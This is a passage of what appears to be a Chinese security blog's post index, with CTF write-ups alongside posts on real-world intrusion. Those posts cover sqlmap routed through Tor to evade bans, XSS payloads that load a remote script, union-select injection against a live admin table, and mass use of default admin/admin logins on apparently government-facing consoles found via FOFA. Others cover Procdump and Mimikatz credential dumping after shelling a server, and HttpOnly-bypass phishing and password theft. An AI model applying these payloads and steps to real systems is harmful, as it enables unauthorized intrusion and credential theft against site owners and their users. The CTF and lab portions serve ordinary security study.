,Oracle以及Postgresql。现在有一些程序能让我们有能力通过结构化查询来管理大型数据库。脚本小子一定已经动手体验了类似SQL注入等这样的操作，虽然他们可能已经通过使用自动化工具例如SQL Map或者SQLNinja来实施攻击，但却还不知它真正的原理。我们将要使用的实验室是SQLi Labs，它是一个可以从 https://github.com/Audi-1/sqli-labs 免费下载，以便我们研究学习以及编写安全的程序。所以这篇教程对于程序员和安全测试者都将是一次动手实践的机会。 安装从 https://github.com/Audi-1/sqli-labs 下载源代码 将源代码复制到Apache webroot 文件夹（htddocs，/var/www） 打开sql-connections文件夹下的“db-creds.inc”文件 修改mysql用户名和密码为你自己的 打开浏览器，通过localhost的index.html访问文件夹 点击setup/resetDB 链接在你的mysql中创造数据库 之后开始游戏吧！","link":"/2017/06/10/SQLi Labs指南/"},{"title":"Tor-IP-Changer实现Sqlmap自动切换代理IP","text":"sqlmap注入的过程中总出现被ban掉IP的情况，面对一片大姨妈，没有代理池只能放弃？ 使用工具：小飞机、Proxifier、Tor Browser、Tor IP Changer（传送门）、Sqlmap 操作步骤：首先连上小飞机 配置Proxifier配置代理服务器 配置代理规则 此时你已经是全局代理状态了 配置并打开Tor浏览器（不要关闭） 打开Tor IP Changer点击 TOR server -&gt; Start，等待软件自动配置完成 点击 Options -&gt; Settings -&gt; Interval(IP切换间隔时间，越快越不稳）-&gt; Save 点击 IP changer -&gt; Start，如下图所示即为成功 Sqlmap命令1sqlmap.py -u url --tor --tor-type=\"SOCKS5\" 参考文章：使用此方法在匿名度，安全性上都可以大大提高，不过代价就是要牺牲掉一部分速度和稳定性。 https://www.freebuf.com/column/171981.html","link":"/2019/07/08/Tor-IP-Changer实现Sqlmap自动切换代理IP/"},{"title":"Windows杀软在线对比辅助","text":"解决平时渗透时的痛点。 在渗透测试过程中，Windows主机上总会遇到各种各样的杀软，人工去看系统进程也是比较麻烦的一件事。 然后发现网上好像也没人写过这个东西，就有了这个Windows杀软在线对比辅助。 GitHub：https://github.com/r00tSe7en/get_AV 在线版：Windows杀软在线对比辅助 分享出来，一是为了方便有需要的人，二是也希望表哥们可以分享一些平时遇到的比较冷门的杀软进程，后续GitHub和在线版会一直保持同步更新数据。","link":"/2019/09/01/Windows杀软在线对比辅助/"},{"title":"Xss之HttpOnly下的攻击手法","text":"仅作思路整理，实际利用代码未提供，请自行收集。 1.phpinfo页伪造对方身份访问同站的phpinfo页面，因为同域所以通过ajax提交访问可以读取到responseText，其中$_SERVER[“HTTP_COOKIE”]会打印出具有httponly属性的cookies。 优点：成功率很高，最不容易被察觉，也是最常用的一种方式。 缺点：需要phpinfo页，条件苛刻。 2.框架钓鱼通过&lt;iframe&gt;标签嵌入一个远程域，完全撑开后，以覆盖原有的页面。 优点：无跳转，域名无改变。 缺点：通常会覆盖某个正常的页面，管理员易察觉。 3.跳转钓鱼通过购买相似域名，构建相同的钓鱼页面，使受害者跳转至钓鱼站。 优点：主动性较强，可主动钓鱼。 缺点：成本较高，且由于页面跳转过于明显，所以此方法十分容易被发现。 4.历史密码通过js伪造登录表单，欺骗浏览器自动填入，由此获取浏览器记住的历史密码。 优点：不易被发现，可直接获取明文，成功率较高。 缺点：各内核浏览器兼容性不一，最新版google已不支持http协议下的自动填入功能。 5.获取源码通过xss获取后端页面源码，常常可以发现一些越权访问，或者配合CSRF打组合拳去添加新用户或者执行其他的功能，以及通过审计后台js发现一些漏洞等。 优点：信息获取的比较详细，也可以获取到后台账号名称。 缺点：局限性较大，不易于利用。 欢迎师傅们补充。。","link":"/2019/10/26/Xss之HttpOnly下的攻击手法/"},{"title":"YIT-CTF>Web:Where is My text？","text":"出题思路： &gt;&gt;index.php：1234567891011121314151617181920&lt;html&gt;&lt;body&gt;&lt;title&gt; where is my key text?&lt;/title&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;center&gt;我们的目标是黑掉YY组织的电脑并且从中提取出key，&lt;br&gt;通过情报我们得知YY有很多文件都是放在desktop的，&lt;br&gt;现如今我们需要找到key，找到它你就找到了全世界。&lt;br&gt;&lt;/center&gt;&lt;?phpfunction curl($key){ $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $key); curl_setopt($ch, CURLOPT_HEADER, 0); curl_exec($ch); curl_close($ch);}echo &quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;center&gt;This Is YY Authentication.Tall Me Key！&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;;@$key = $_GET[&apos;key&apos;];curl($key);?&gt;&lt;!-- For GET(method) &apos;KEY&apos; !!!--&gt;&lt;/body&gt;&lt;/html&gt; &gt;&gt;Key.txt文件：在桌面创建key.txt,并键入flag的内容 注意：1.增加难度可添加用户YY，将key.txt放置YY的desktop，思路中对应路径会变 解题思路：重难点php伪协议：传送门 F12查看源代码发现，可知是get类型传值1&lt;!– For GET(method) 'KEY'!!!–&gt; 2.由标题得知我们要找文件，且不是注入类型，是文件类型 1Title：Where is My text？ 尝试传URL[SSRF]，显示了HTTP内容，但并没有得到我们想要的flag 1?key=http://127.0.0.1:80 由网页内容可知，我们应该找文件所在地并读取 尝试访问桌面文件key.txt 1?key=file:///c:/users/administrator/desktop/key.txt 特别感谢：出题人：独孤煜阳","link":"/2017/05/11/YIT-CTF  Web：Where is My text？/"},{"title":"YIT-CTF>Web:一种编码","text":"出题思路： 了解JSFuck编码 JSFuck是基于JavaScript原子部分的深奥和教育式编程风格。它只使用六个不同的字符来编写和执行代码。 基本 123456789101112131415false =&gt;！[] true =&gt; !! [] undefined =&gt; [] [[]] NaN =&gt; + [！[]] 0 =&gt; + [] 1 =&gt; +！+ [] 2 =&gt;！+ [] +！+ [] 10 =&gt; [+！+ []] + [+ []] Array =&gt; [] Number =&gt; + [] String =&gt; [] + [] Boolean =&gt;！[] Function =&gt; [] [“filter”] eval =&gt; [] [“filter”] [“constructor”]（CODE）（） window =&gt; [] [“filter”] [“constructor”]（“return this”）（） 请看这里的完整列表。 生成编码网址：传送门 解题思路：将jsfuck编码直接复制到控制台运行，即可弹出答案。","link":"/2017/07/01/YIT-CTF  Web：一种编码/"},{"title":"YIT-CTF>Web:比较","text":"出题思路：&gt;&gt;index.php：12345678910111213141516&lt;html&gt; &lt;head&gt; &lt;meta http-equiv=Content-Type content=&quot;text/html;charset=utf-8&quot;&gt; &lt;/head&gt; &lt;body&gt; &lt;form action=&quot;&quot; method=&quot;post&quot;&gt; &lt;input type=&quot;text&quot; maxlength=&quot;3&quot; name=&quot;v&quot;/&gt; &lt;input type=&quot;submit&quot; value=&quot;提交&quot;/&gt; &lt;?php $i = isset($_POST[&apos;v&apos;])?$_POST[&apos;v&apos;]:&apos;&apos;; if($i&gt;&apos;999&apos;) echo &quot;yitctf{iwantsomethingjustlikethis}&quot;; ?&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; 解题思路： F12查看源代码，发现输入框里限制了输入的字符个数为3个[且题目说道：要求输入大于服务器内的数值，通过尝试最大的三位数999也不对] 所以想到修改限制输入的值，将其改为大于3的数值，之后即可输入3位数以上的数，提交后显示出答案~~ 特别感谢：出题帮助：影风[小诗不识月]","link":"/2017/05/13/YIT-CTF  Web：比较/"},{"title":"YIT-CTF>密码学:卢本伟","text":"出题思路：没有什么思路，仅仅是因为我喜欢吃培根。。。。 百度培根密码：传送门 解题思路：提目Tip提示：LOL我只服五五开-&gt;五五开？ 看题目的密码特征-&gt;五个一组刚好符合培根密码格式 对照解密方式解密，即可得到答案","link":"/2017/05/11/YIT-CTF  密码学：卢本伟/"},{"title":"YIT-CTF>Web:前女友","text":"出题思路：MD5弱类型比较PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。 关于PHP hash比较缺陷详细介绍：http://www.freebuf.com/news/67007.html Python脚本:[ 可自定义字符的自动化脚本，更改payload即可，字符串长度则是修改getStr(payload,s,slen)的slen ] 123456789101112131415161718192021# -*- coding: utf8 -*-#author:kalbertlee#http://blog.csdn.net/kalbertleeimport hashlibpayload = \"QWERTYUIOPASDFGHJKLZXCVBNM\"#payload = \"qwertyuiopasdfghjklzxcvbnm\"#payload = \"0123456789\"def calcMd5(s):MD5 = hashlib.md5(s).hexdigest()if MD5[0:2] == \"0e\" and MD5[2:32].isdigit():print s,MD5def getStr(payload,s,slen):if len(s) == slen:#Custom stringcalcMd5(s)return sfor j in xrange(len(payload)):sl= s+payload[j]getStr(payload,sl,slen)if __name__ == '__main__':getStr(payload,'',7) 一些0e开头MD5的字符串: 纯数字类： 12345678910111213141516171819202122232425240610708 0e462097431906509019562988736854314282422 0e990995504821699494520356953734571579406 0e972379832854295224118025748221903251147 0e1745105038239329423613532093841110242161 0e4358745584886258913248611981031320830526 0e9120959589854833469954140608321586264293 0e6227436711559957376396627184982302756269 0e2505668884974737987244267944622427435592 0e0676969523286697324754984723432653531602 0e8774875223415447580288106108853293867441 0e4710012013036025439211445702603295421201 0e7038703330022326812396188562203465814713 0e2586316456509996645217055371223524854780 0e5074190624898878270878157351953908336290 0e8076244989591904158812482452714011627063 0e4858056870344399059383627017754775635065 0e9982120899466409675994503611684790555361 0e6434422146609944301344924645125432453531 0e5123186990858816308618905260975579679820 0e8776220117302218034617401849155585393579 0e6643573553823058059927653370236376552501 0e1658867069974821878702155780157124129977 0e5000073610447478046821220608767197546197 0e9151885760724691014573156755027656486157 0e451569119711843337267091732412 大写字母类： 123456789101112131415161718QLTHNDT 0e405967825401955372549139051580QNKCDZO 0e830400451993494058024219903391EEIZDOI 0e782601363539291779881938479162TUFEPMC 0e839407194569345277863905212547UTIPEZQ 0e382098788231234954670291303879UYXFLOI 0e552539585246568817348686838809IHKFRNS 0e256160682445802696926137988570PJNPDWY 0e291529052894702774557631701704ABJIHVY 0e755264355178451322893275696586DQWRASX 0e742373665639232907775599582643DYAXWCA 0e424759758842488633464374063001GEGHBXL 0e248776895502908863709684713578GGHMVOE 0e362766013028313274586933780773GZECLQZ 0e537612333747236407713628225676NWWKITQ 0e763082070976038347657360817689NOOPCJF 0e818888003657176127862245791911MAUXXQC 0e478478466848439040434801845361MMHUWUV 0e701732711630150438129209816536 strcmp的数组get漏洞:在PHP 5.3版本以上的strcmp()有一个bypass漏洞，在说这个漏洞之前我们先来看一下strcmp()这个函数。（注意该比较区分大小写） 1int strcmp( string $str1, string $str2) 如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。 测试代码如下： 12345678910&lt;?php$password = $_GET['pass']; if (strcmp('websec',$password)){ echo \"No!\";}else{ echo \"Success!\";}?&gt; strcmp()在比较字符串和数组的时候直接返回0，这样通过把目标变量设置成数组就可以绕过该函数的限制 1http://127.0.0.1/str.php?pass[]=1 &gt;&gt;index.php：123456789101112131415161718192021222324252627282930313233&lt;html&gt;&lt;body&gt;&lt;title&gt;前女友&lt;/title&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;center&gt;分手了，纠结再三我没有拉黑她，原因无它，放不下。&lt;br&gt;终于那天，竟然真的等来了她的消息：“在吗？”&lt;br&gt;我神色平静，但颤抖的双手却显示出我此刻的激动。“怎么了？有事要我帮忙？”&lt;br&gt;怎么，没事就不能联系了吗？”结尾处调皮表情，是多么的陌生和熟悉……&lt;br&gt;帮我看看这个...说着，她发来一个&lt;a href=&quot;http://www.se7ensec.cn/yitctf/web6/reply.txt&quot;&gt;链接&lt;/a&gt;&lt;br&gt;不忍心拂她的意就点开了，看着屏幕我的心久久不能平静，往事一幕幕涌上心头......&lt;br&gt;我到底做错了什么，要给我看这个！&lt;br&gt;还记得你曾经说过。。。。。。。。&lt;br&gt;PHP是世界上最好的语言~(笑cry...)&lt;br&gt;&lt;/center&gt;&lt;center&gt;&lt;?phperror_reporting(0);$flag = &quot;yitctf{Php_1s_tH3_B3St_L4NgUag3}&quot;;if(isset($_GET[&apos;v1&apos;]) &amp;&amp; isset($_GET[&apos;v2&apos;]) &amp;&amp; isset($_GET[&apos;v3&apos;])){ $v1 = $_GET[&apos;v1&apos;]; $v2 = $_GET[&apos;v2&apos;]; $v3 = $_GET[&apos;v3&apos;]; if($v1 != $v2 &amp;&amp; md5($v1) == md5($v2)){ if(!strcmp($v3, $flag)){ echo $flag; } }}?&gt;&lt;/center&gt;&lt;/body&gt;&lt;/html&gt; &gt;&gt;reply.txt：123456789101112&lt;?phpif(isset($_GET[&apos;v1&apos;]) &amp;&amp; isset($_GET[&apos;v2&apos;]) &amp;&amp; isset($_GET[&apos;v3&apos;])){ $v1 = $_GET[&apos;v1&apos;]; $v2 = $_GET[&apos;v2&apos;]; $v3 = $_GET[&apos;v3&apos;]; if($v1 != $v2 &amp;&amp; md5($v1) == md5($v2)){ if(!strcmp($v3, $flag)){ echo $flag; } }}?&gt; 解题思路：利用经典的md5 弱类型匹配和strcmp的数组get漏洞，当strcmp（数组，字符串）==0，然后我们构造payload如下 1http://www.xxx.com/index.php?v1=QNKCDZO&amp;v2=240610708&amp;v3[]=011 得到flag","link":"/2017/07/21/YIT-CTF  Web：前女友/"},{"title":"YIT-CTF>Web:爆破","text":"出题思路：&gt;&gt;index.php 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071&lt;?php error_reporting(0);$password = &quot;13579&quot;; // 这里是密码 $p = &quot;&quot;; if(isset($_COOKIE[&quot;isview&quot;]) and $_COOKIE[&quot;isview&quot;] == $password){ $isview = true; }else{ if(isset($_POST[&quot;pwd&quot;])){ if($_POST[&quot;pwd&quot;] == $password){ setcookie(&quot;isview&quot;,$_POST[&quot;pwd&quot;],time()+3600*3); $isview = true; }else{ $p = (empty($_POST[&quot;pwd&quot;])) ? &quot;需要密码才能查看，请输入密码。&quot; : &quot;密码不正确，请重新输入。&quot;; } }else{ $isview = false; $p = &quot;请输入密码查看flag&quot;; } } if($isview){ ?&gt; yitctf{2017/5/16}&lt;?php }else{ ?&gt; &lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot; http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt; &lt;html xmlns=&quot; http://www.w3.org/1999/xhtml&quot;&gt; &lt;head&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; &lt;meta http-equiv=&quot;pragma&quot; content=&quot;no-cache&quot; /&gt; &lt;meta http-equiv=&quot;cache-control&quot; content=&quot;no-cache&quot; /&gt; &lt;meta http-equiv=&quot;expires&quot; content=&quot;0&quot; /&gt; &lt;title&gt;请输入密码&lt;/title&gt; &lt;!--[if lt IE 6]&gt; &lt;style type=&quot;text/css&quot;&gt; .z3_ie_fix{ float:left; } &lt;/style&gt; &lt;![endif]--&gt; &lt;style type=&quot;text/css&quot;&gt; &lt;!-- body{ background:none; } .passport{ border:1px solid red; background-color:#FFFFCC; width:400px; height:100px; position:absolute; left:49.9%; top:49.9%; margin-left:-200px; margin-top:-55px; font-size:14px; text-align:center; line-height:30px; color:#746A6A; } --&gt; &lt;/style&gt; &lt;div class=&quot;passport&quot;&gt; &lt;div style=&quot;padding-top:20px;&quot;&gt; &lt;form action=&quot;?yes&quot; method=&quot;post&quot; style=&quot;margin:0px;&quot;&gt;输入查看密码 &lt;input type=&quot;password&quot; name=&quot;pwd&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;查看&quot; /&gt; &lt;/form&gt; &lt;?php echo $p; ?&gt; &lt;/div&gt; &lt;/div&gt; &lt;?php } ?&gt; &lt;/body&gt; &lt;/html&gt; 解题思路：一个简单的纯数字密码爆破，利用BurpSuite工具爆破密码即可 爆破方法：传送门","link":"/2017/05/16/YIT-CTF  Web：爆破/"},{"title":"YIT-CTF>隐写术:flag在哪里？","text":"出题思路：电脑中图片属性-&gt;详细信息有一个备注功能，但是一般很难注意到这个备注，所以可以用来隐藏信息 解题思路：右击图片&gt;属性&gt;详细信息&gt;查看备注的内容得到flag","link":"/2017/05/22/YIT-CTF  隐写术：flag在哪里？/"},{"title":"YIT-CTF>隐写术:像素游戏","text":"出题思路：1.PS中创建一张500x500的背景图 2.在底部添加flag文字图层 3.生成png图片格式，并保存 4.用WINhex打开flag.png，修改其中第二行的第7列的F4为A4并保存，发现图片高度缩小了，由此达到了隐藏flag的目的 解题思路： PNG图片结构详解:传送门 用WINhex打开flag.png[简介： WINhex – 16进制的文本编辑器与磁盘编辑软件。专门用来对付计算机取证、数据恢复、低级数据处理、以及 IT 安全性、各种日常紧急情况的高级工具: 用来检查和修复各种文件、恢复删除文件、硬盘损坏、数码相机卡损坏造成的数据丢失等；可以进行Hex和ASCII编码的编辑与修改，支持多文件搜寻替换功能模式，一般和逻辑运算，磁盘磁区的编辑(包括FAT16、FAT32和NTFS分区格式)，文件比对和分析功能] 找到第二行，通过对应结png构详解，了解到前八位即为图片高度和宽度，根据题目提示，应为正方型[500x500]，所以我们将A4改为F4，之后保存打开图片，就又恢复为原图，即可看到flag~~","link":"/2017/05/23/YIT-CTF  隐写术：像素游戏/"},{"title":"YIT-CTF>隐写术:喵喵喵","text":"解题思路：第一步：打开wav文件，听到滴滴的声音，估计是摩斯编码，仔细听但是听不出声音长短 第二步：使用audacity[音频分析工具]看波形的长度来判断声音的长短 第三部：选中放大，根据波形写出摩斯密码","link":"/2017/09/27/YIT-CTF  隐写术：喵喵喵/"},{"title":"新的起点，新的开始！","text":"博客始建于2016年九月份，最开始用的是ZBLOG，后来因为修改博客后台配置文件导致后台崩溃； 但是既然当初决定要写博客，我想就算是重新来一次，我也要坚持写下去；因为我感觉博客不只是知识的巩固，还是成长的记录；于是，我将原来博客的40多篇文章保存到本地后，重置了服务器；之后我选择了用WordPress建站程序，因为感觉wp比较稳定；至此，我的新博客又重新开启了；","link":"/2017/05/04/hello-world/"},{"title":"一处图片引用功能导致的XSS","text":"未来迷人绚烂总在向我召唤，哪怕只有痛苦作伴也要勇往直前。 山重水复疑无路漏洞点：站点产品评论处 初步测试一开始尝试XSS，发现程序有过滤，提交均显示Tags are not permitted，最后测出来的是过滤 &lt; ，不过滤 &gt; 因为提示速度比较快，猜测前端有一层检测。尝试绕过前端检测，burp拦截正常提交的内容，替换xss payload后发送，发现会自动跳转回首页，由此发现程序后端也有内容检测，这里直接xss暂时行不通。 查看编辑器的其他功能： 图片上传：可上传aspx（其他可能解析后缀均已尝试），不能解析并跳转至首页。可上传html并解析，这种方式构造的xss通常需要主动攻击，且攻击时易被管理员察觉到异常，暂不考虑。 表情功能：没什么可利用的。 柳暗花明又一村当看到编辑器提示的 img 外部图片引用方式时引起了我的注意，这里感觉可以操作一下： 正常测试先来看下正常引用方式时前端的显示，链接被带入到src中（logo前文字涉及域名，打码）： 1[img|XSSURL|xxxxx Logo] 带入payload把xss payload 放在链接的位置再看一下： 1234常规的payload：&lt;img src=x onerror=s=createElement(&apos;script&apos;);body.appendChild(s);s.src=&apos;XSSURL&apos;;&gt;构造的payload：[img|x onerror=s=createElement(&apos;script&apos;);body.appendChild(s);s.src=&apos;XSSURL&apos;;|xxxxx Logo] 提交后审查元素发现为如下显示： 尝试闭合尝试闭合 x 处的双引号，让 onerror 逃逸出来： 1[img|x&quot; onerror=s=createElement(&apos;script&apos;);body.appendChild(s);s.src=&apos;XSSURL&apos;;|hello] 这里提交后发现payload并没有执行成功，仔细看发现程序输出时分别在 onerror= 和 ; 后面加了双引号。 闭合成功直接给个 &gt; 让它闭合，虽然成功加载了，但是页面显示会有错误，这样十分容易被发现倪端，不够完美。 1[img|x&quot; onerror=s=createElement(&apos;script&apos;);body.appendChild(s);s.src=&apos;XSSURL&apos;;&gt;|hello] 换个思路通过闭合掉 ; 后面的双引号，显示效果如下： 1[img|x&quot; onerror=s=createElement(&apos;script&apos;);body.appendChild(s);s.src=&apos;XSSURL&apos;;&quot;|hello] 最终在没有任何错误内容显示的情况下成功执行了xss payload： 看到这里可能有人就会想，这种案例触发的xss是不是很少存在，因为毕竟不是每个编辑器都用这种图片外链引用方式，那么请继续看下面。 灵活运用这几天在搞一个gangdu的论坛，在回复功能处，又遇到了同样的问题。 本来这个功能应该只能放图片链接的，但是这里插入的链接格式和内容并没有做校验。 1x onerror=s=createElement(&apos;script&apos;);body.appendChild(s);s.src=&apos;XSSURL&apos;; 这里直接把payload放进去，看下前端显示 同样的思路，这里直接闭合就好了 1x&quot; onerror=&quot;s=createElement(&apos;script&apos;);body.appendChild(s);s.src=&apos;XSSURL&apos;; 成功加载payload 平时渗透的时候，看到功能点不要上去就是蛮干，先预想下这个功能是大概怎么实现的，然后思路猥琐一点，心细一点，往往会有意想不到的收获的，就写到这里吧。","link":"/2019/12/04/一处图片引用功能导致的XSS/"},{"title":"人品爆发：偏移注入与移位溢注的联合使用","text":"理解一个东西，然后去发散思维思考，总会有意想不到的收获。 前言：这个灵感是我突然冒出来的，最近有一个只能出来表名的站，一直没的机会实战，正好练习一下偏移注入和移位溢注，顺便总结一下,结果偏移注入成功了，移位溢注倒是不行了，心有不甘（我人品有这么差么？），才有了下文。 偏移注入，移位溢注的正常的手法，原理在这里就不写了，描述下站点大概情况，方便大家了解，懂得自然懂。 12order by 12 - 正常 union select 1,2,3,4,5,6,7,8,* from tbladmin - 正常 显示位 开始移位溢注：当我使用移位溢注时，遇到了一点小麻烦： 2.1 先测试位置显示位6（失败）：1union select 1,2,3,4,5,tbladmin.*,10,11,12 from tbladmin 1234union select 1,2,3,4,5,tbladmin.*,10,11,12 from tbladmin where id=1 - 返回同上union select 1,2,3,4,5,tbladmin.*,10,11,12 from tbladmin where id=2 - 发布时间处:1变成了2...union select 1,2,3,4,5,tbladmin.*,10,11,12 from tbladmin where id=n - 开始一直返回正常页面了 2.2 然后测试显示位2和3(失败)：1union select 1,tbladmin.*,6,7,8,9,10,11,12 from tbladmin - 爆出了一个用户名 1234union select 1,tbladmin.*,6,7,8,9,10,11,12 from tbladmin where id=1 - 返回内容同上union select 1,tbladmin.*,6,7,8,9,10,11,12 from tbladmin where id=2 - 如下图，一个新的用户名...union select 1,tbladmin.*,6,7,8,9,10,11,12 from tbladmin where id=n - 开始一直返回正常页面了 到了现在，可以发现问题出现了，移位溢注的招式已经用完了，但是显示位明显不够啊，还是爆不出来密码，这样看来，移位溢注还是不能完全和人品说拜拜 联合使用出奇效：偏移注入的本质是：打乱显示顺序 移位溢注的本质是：占用多处显位 都是为了有一定概率让账号密码出现在显示位上，那么联合起来会怎么样呢？下面语句不做分析，还是懂的人自然懂 1union select 1,2,3,4,a.*,b.*, * from (tbladmin as a inner join tbladmin as b on a.id=b.id) 12union select 1,2,3,4,a.*, * from (tbladmin as a inner join tbladmin as b on a.id=b.id) - 显示结果同上union select 1,2,3,a.*,4, * from (tbladmin as a inner join tbladmin as b on a.id=b.id) - 出现密码了 1union select 1,2,a.*,3,4, * from (tbladmin as a inner join tbladmin as b on a.id=b.id) - 发生变化 1union select 1,a.*,2,3,4, * from (tbladmin as a inner join tbladmin as b on a.id=b.id) - 继续变化 1union select a.*,1,2,3,4, * from (tbladmin as a inner join tbladmin as b on a.id=b.id) - 同时显示 完结最后可以看到，账号密码一起显示在了网页上，通过二者的联合使用，爆出账号密码的几率想必会增加不少。 参考文章： https://blog.csdn.net/Fly_hps/article/details/79415714 https://gh0st.cn/archives/2017-03-08/1","link":"/2019/03/11/人品爆发之偏移注入与移位溢注的联合使用/"},{"title":"他的她","text":"《他的他》 第一次见她时是八月份的夏天在自习室门口一个安静漂亮的女孩干净利落 或许是情投意合那个秋天他们走到了一起平平淡淡我想我将永远的欠她一个浪漫的告白 转眼冬天到来我陪着她看到了两个人的第一场雪她傻笑着，拍了下来跟我说以后每年都要照一张 大学第一个学期即将结束但愿每个美好的开始都有一个完美的结局","link":"/2016/12/25/他的她/"},{"title":"关于一个伪0day的挖掘","text":"放一个在某服务器上down下来的管理员的小片片镇楼~~ 前言：当你看到这篇文章标题点进来以后，没错你已经被坑了，本文没有任何技术含量，只不过思路可以借鉴一下。。。 漏洞的发现：最初这个程序的弱口令漏洞的发现，是我找tomcat服务时无意间点出来的，尝试访问了下界面 这是登陆界面，没错密码就是admin admin 登陆进去后大概就是一个和tomcat有同样的功能的管理界面，也可以通过发布war包来getshell，界面比tomcat友好很多，这里我就不再截图了。 伪0day的发现：关键信息发掘：看上面登陆界面的信息：北京华宇信息技术有限公司 百度下这个公司，看看他的大概信息。 这是这套程序提供的服务，都是些政府，法院，金融…..的服务。 信息的利用：假设这套系统的默认密码就是admin admin，那么我们如何去放大它的危害？没错就是能够批量利用。 我们再回去看登陆界面那两个图，8080端口界面网页的标题是：Tas ROOT程序，登陆界面/tas-console/login.jsp的网页标题是：TAS管理控制台，且登陆界面没有任何验证码限制。 猜想：如果我们大量采集开放8080端口的IP并获取网页标题为Tas ROOT程序的网址，或匹配登陆界面的/tas-console/login.jsp的网址等办法；利用这个程序的特性去判断，然后再去批量用admin admin账号密码登陆，危害可想而知。 为了验证猜想，我并没有真的去批量采集ip测试，因为时效性也是个问题。然后想起了类似Shodan搜索一样功能的国内搜索引擎fofa，然后就是利用搜索平台的搜索规则去构造语句了。 我这里随便写了一个title=&quot;Tas&quot; &amp;&amp; country=CN，然后去查询 如你所见，这里的目标大多都可以登陆，且可以轻松getshelll（我不会写出详细步骤的，免得惹事生非），而且因为程序的特殊性，大多数时候都是root或者system权限。而且你会发现，沦陷的基本都是在运行一些比较敏感的服务，这里就不举例说明了。 最后总结：特别强调：本文只是漏洞利用的一个思路的拓展，希望大家保持良好的职业操守，切莫伸手，伸手必被抓，法网恢恢，疏而不漏！","link":"/2018/11/25/关于一个伪0day的挖掘/"},{"title":"修改yilia主题打赏图片的大小","text":"最近发现了一个好玩的的东西，就是动态二维码（制作方法请自行百度），然后用收款码生成之后放在yilia主题打赏处，发现WTF???图片被缩的太小了，扫都扫不出来。 百度了一下发现有人提问但是没人解决，没关系，方法总比困难多，审查元素，去看看打赏处的CSS代码~ 0x01 代码分析：这是蓝底框架的： 这是收款码图片的： 0x02 代码修改：CSS文件路径：/themes/yilia/source/main.0cf68a.css 打开CSS文件直接搜索： 1.page-reward .reward-img 修改二维码的宽和高 1.tooltip-top .tooltip-content 先修改蓝底框架的宽度（宽度&gt;二维码宽度*2），再修改第二个偏移量（偏移量=你设置宽度/2） 设置完成保存后，即可重新发布，查看效果。","link":"/2018/08/23/修改yilia主题打赏图片的大小/"},{"title":"初涉正则表达式","text":"最近总是看到有人问正则表达式匹配特定字符串之类的问题，才发现自己之前一直忽略了这个东西，而且群里发出来的正则语句完全看不懂，感觉挺有意思的，以后应该也会用得到。 然后就百度查资料，用了几个小时看了一下，大致了解了正则的匹配原理，反正最后能写出来比较简单的正则表达式，算是没白看吧。不过看到高级一点的还是头痛啊，看不懂看不懂。。。 这里就简单分享个我觉得讲的还不错的网站，短时间内容易看懂的：传送门 而且这个网站还有个正则匹配测试工具[Regex Match Tracer]挺好用的，自己去网站里下载吧~","link":"/2018/11/20/初涉正则表达式/"},{"title":"利用Procdump+Mimikatz获取Windows帐户密码","text":"0x01 前言：前段时间拿下一个网站的shell，很幸运的是直接就是System权限，结果发现执行添加用户命令并不能成功回显 看了下系统进程，原来是开启了360的主动防御，奈何也不会做免杀，上传exp运行就被杀，尝试各种方法去kill主动防御进程，无果。。。 在土司发帖求助了一下经验丰富的大佬们，然后就有了如下文章： 实验环境：win7企业版64位 0x02 导出lsass.exe首先要获取到内存文件lsass.exe进程, 它用于本地安全和登陆策略,一般在进程管理器中能看到 这里用到微软官方发布的工具Procdump导出lsass.exe，所以不存在被杀软拦截的情况： procdump64.exe -accepteula -ma lsass.exe lsass.dmp 0x03 执行mimikatz这里不建议直接上传到服务器上执行，一是有一定概率出现玄学bug导致服务器崩溃，二是可能会被杀软拦截 将lsass.dmp下载到本地后，然后执行mimikatz mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; exit 0x04 列出账号密码可以看到有明文的密码，还有NTLM的hash hash可以拿去网站解密下，一般情况下六位以下密码还是很容易破解出来的 当然该工具不只有这一种用法，具体的去看官方文档可以去灵活使用。","link":"/2018/11/08/利用procdump64+mimikatz获取windows帐户密码/"},{"title":"剑走偏锋：旁站入侵到提权","text":"已经实习了一个月，感觉每天还是很充实的~ 前言：目标站：A.com 在经过一系列常规操作之后，发现主站没有什么可以入手的地方，好在 A 站没有CDN，可以尝试从旁站切入。 IP反查，得到大概20几个同服域名，手动过了几个，发现旁站 B.com (aspx+mssql) 某页面参数加单引号后报错，丢到sqlmap里先去跑一下，继续看别的旁站，然而大部分都是WordPress站点或者是纯静态也没什么搞头，看了一会发现sqlmap跑出来的结果如下： 123456789101112---Parameter: ProductID (GET)Type: boolean-based blind Title: AND boolean-based blind - WHERE or HAVING clause Payload: ProductID=2' AND 1913=1913 AND 'GquC'='GquCType: error-based Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause(IN) Payload: ProductID=2' AND 1360 IN (SELECT (CHAR(113)+CHAR(113)+CHAR(107)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (1360=1360) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(113)+CHAR(98)+CHAR(113))) AND 'JOdp'='JOdp---web server operating system: Windows 8.1 or 2012 R2web application technology: ASP.NET 4.0.30319, ASP.NET, Microsoft IIS 8.5back-end DBMS: Microsoft SQL Server 2008 